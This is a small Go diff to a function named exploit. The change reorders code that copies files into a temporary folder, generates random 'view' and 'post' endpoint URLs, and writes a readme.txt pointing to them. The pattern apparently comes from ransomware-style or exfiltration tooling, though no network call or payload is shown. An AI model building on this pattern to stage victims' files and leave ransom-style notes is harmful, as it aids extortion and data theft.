@@ -90,11 +90,13 @@ func exploit(os_path string, tmp_folder string, is_win bool) bool {
 		utils.FileCopy(full_path, dest)
 	}
 
-	// create readme
+	// generate url
 	random_string := utils.GenerateRandomString(40)
-	readme_file := tmp_folder + "readme.txt"
 	dummy_endpoint_to_view_url := urlBuilder("view", random_string)
 	dummy_endpoint_to_post := urlBuilder("post", random_string)
+
+	// create readme
+	readme_file := tmp_folder + "readme.txt"
 	readme_content := readme_message + dummy_endpoint_to_view_url + "\n\nfolder: " + tmp_folder
 	utils.CreateReadme(readme_file, readme_content)
 
